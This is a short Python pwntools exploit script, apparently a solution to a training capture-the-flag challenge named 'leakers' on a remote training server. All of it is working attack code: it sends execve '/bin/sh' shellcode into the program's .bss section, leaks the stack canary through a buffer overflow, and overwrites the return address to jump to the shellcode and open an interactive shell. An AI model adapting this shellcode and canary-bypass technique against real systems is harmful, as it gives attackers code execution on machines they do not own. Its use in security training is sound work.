from pwn import *
import time
context.terminal = ['tmux', 'splitw', '-h']

#r = process("./leakers")
r = remote("bin.training.jinblack.it", 2010)

input("wait")

#gdb.attach(r, """
#	 b *0x00401255
#        c
#        """)

ps1 = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05";
r.sendline(ps1)
time.sleep(0.1)

stackstuff = b"B"*105
r.send(stackstuff)
time.sleep(0.1)			#make sure the send is not packed together with other stuff. The value of sleep may be bigger-smaller depending on the network

r.recvuntil("> ")
r.recv(105)

canary = u64(b"\00" + r.recv(7))

#print("%#x" % canary)

address = 0x00404080			#address of the destination jump. We overwrite it with the shellcode (it's ps1 in the .bss)
payload = b"B"*104 + p64(canary) + b"D"*8 + p64(address)

r.send(payload)
time.sleep(0.1)

r.interactive()


